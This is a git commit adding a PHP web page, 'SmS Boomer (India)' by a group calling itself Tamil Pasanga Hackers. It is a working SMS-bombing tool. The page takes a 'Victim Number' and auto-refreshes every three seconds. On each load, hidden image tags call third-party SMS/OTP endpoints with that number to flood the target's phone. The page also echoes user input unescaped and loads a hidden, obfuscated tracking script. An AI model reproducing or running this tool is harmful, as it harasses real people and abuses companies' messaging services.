82c81a2172cd42f7c9764e4f88dc7a5cd1d718b0
XyberWolf <xyber.result@gmail.com>
2017-05-20 13:04:26 +0530

    SmS Boomer (India)

---
+++ TPH_SmSB00M.php
@@ -0,0 +1,180 @@
+       
+	   
+	   
+
+
+		<!-- 									TPH 
+					
+					__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\\\____/\\\________/\\\_        
+					 _\///////\\\/////__\/\\\/////////\\\_\/\\\_______\/\\\_       
+					  _______\/\\\_______\/\\\_______\/\\\_\/\\\_______\/\\\_      
+					   _______\/\\\_______\/\\\\\\\\\\\\\/__\/\\\\\\\\\\\\\\\_     
+						_______\/\\\_______\/\\\/////////____\/\\\/////////\\\_    
+						 _______\/\\\_______\/\\\_____________\/\\\_______\/\\\_   
+						  _______\/\\\_______\/\\\_____________\/\\\_______\/\\\_  
+						   _______\/\\\_______\/\\\_____________\/\\\_______\/\\\_ 
+							_______\///________\///______________\///________\///__
+																					
+							              C0DED BY XYB3R-W0LF 								-->
+
+										 
+<?php
+$tel_no = $_GET['num'];
+$c = $_GET['count']?$_GET['count']:0;
+$c++;
+?>
+<!DOCTYPE html>
+<html>
+<head>
+
+<title>SmS B00MER .:TPH:. <3</title>
+<?php
+ if($tel_no){
+    echo "<meta http-equiv=refresh content='3; url=TPH_SmSB00M.php?num={$tel_no}&amp;count={$c}'>";
+ }
+?>	
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="http://frontend.oss.aliyuncs.com/bootstrap/2.3.1/css/bootstrap.min.css" rel="stylesheet" media="screen">
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Audiowide' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<style>
+body {margin: 5px;}
+</style>
+</head>
+<style>
+body {
+background: #000000;
+    font-family: 'Lato', sans-serif;
+    color: #FDFCFB;
+    text-align: center;
+margin-top: -80px; }
+.material {
+	width: 90%;
+    background: #FDFCFB;
+    font-family: inherit;
+    color: #737373;
+    letter-spacing: 1px;
+    text-indent: 5%;
+    border-radius: 20px 5px 30px 5px;
+	    padding: 10px;
+    height: 30px;
+    border: none;
+}
+center{
+	width: 250px;
+    margin: 5% auto;
+}
+#submit {
+    width: 30%;
+    padding: 10px;
+    height: 40px;
+    background: green;
+    font-family: inherit;
+    font-weight: bold;
+    color: inherit;
+    letter-spacing: 1px;
+    border-radius: 5px 5px 5px 5px;
+    cursor: pointer;
+    transition: background .3s ease-in-out;
+}
+.button {
+    padding: 35px;
+    height: 35px;
+    border: none;
+}
+#submit:hover {
+    background: #ff0000;
+}
+	</style>
+<style type="text/css">
+
+h1 {color: #ff0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+h2 {color: #777777;font-size: 30px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+h3 {color: #e8d90d;font-size: 15px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+
+.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+	text-align : center;
+	}
+.jokitz2{
+	text-align : center;
+	font-family : Courier;
+	}
+</style>
+<body>
+
+
+<div class="panel panel-success" style="margin-bottom: 0px;">
+    <div class="panel-heading">
+        <h3 class="panel-title"></h3>
+    </div>
+	<form method='GET' action='TPH_SmSB00M.php'>
+		<div class="input-group">
+		<br>
+		
+		<img src="http://www6.0zz0.com/2011/03/14/06/269205957.gif" id="button1" name="button1" border="0" height="7" width="800"></center>
+		<br><font face ="Iceland" style="color:Orange;text-shadow:0px 1px 5px #000;font-size:80px"> Tamil</font><font face ="Iceland" style="color:LavenderBlush;text-shadow:0px 1px 5px #000;font-size:80px"> Pasanga</font><font face="Iceland" style="color:green;text-shadow:0px 1px 5px #000;font-size:80px"> Hackers</font>
+
+
+		<center><b><h2>SMS B00MER By TPH</h2><br><form action='' method='get'><b>
+<input class ='material' placeholder='Victim Number ' type='number' name='num' /><br />
+<br>
+<br>
+<input id='submit' class ='button' type='submit' value='Start'  /><br /> <br/>
+		</div>
+	</form>
+	
+<?php
+ if($tel_no){
+?>
+<br />
+<div id='ajax_thread_msg'>
+<div class='alert alert-success' style='margin-bottom: 0px;'>
+<h3>SMS B00MED 0N <strong><?php echo $tel_no;?></strong> Total <strong><?php echo $c;?></strong> SMS Sent <br> And It Will Continue Till You Close This Tab.</h3>
+</div>
+</div>
+<div style='display:none'>
+
+                 <!-- ADD API HERE -->
+
+<img src='http://www.quikr.com/makeadpremiumsms?mob=<?php echo $tel_no;?>&area=86&isBizMobile=true' alt=''/>
+<img src='http://offers.lenskart.com/sendopt.php?ph=<?php echo $tel_no;?>&operation=start&ts=1376044348191' alt=''/>
+
+<?php
+	}
+?>
+</div>
+  <script src="http://frontend.oss.aliyuncs.com/jquery/1.8.3/jquery.min.js"></script>
+  <script>
+		jQuery(document).ready(function(){
+			jQuery('.btn').click(function(){
+				if(jQuery('input[name="num"]').val() == ""){
+					return false;
+				}
+			});
+		});
+  </script>
+  <img src="http://www6.0zz0.com/2011/03/14/06/269205957.gif" id="button1" name="button1" border="0" height="7" width="800"></center>
+  <a  href="https://www.facebook.com/baskaran668" target="_blank" ><center ><br><b><h1>C0DED BY <br>XYB3R-W0LF </h1><br></center> </a>
+  
+  <p><span style="text-align:center; display: block;"><a href="http://exeideas.blogspot.com/2011/04/how-to-embed-ip-address-widget-of.html"><img src="http://www.wieistmeineip.de/ip-address/?size=468x60" border="0" width="400" height="40" alt="IP" /></a><br /><small><a href="http://exeideas.blogspot.com/2011/04/how-to-embed-ip-address-widget-of.html"></a></small></span></p>
+</body> 
+
+<!--  START (hidden counter)-->
+<script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
+<a href="http://www.histats.com" target=" " title=" " ><script  type="text/javascript" >
+try {Histats.start(1,3192252,4,0,0,0,"");
+Histats.track_hits();} catch(err){};
+</script></a>
+
+<!--  END  -->
+
+</html>
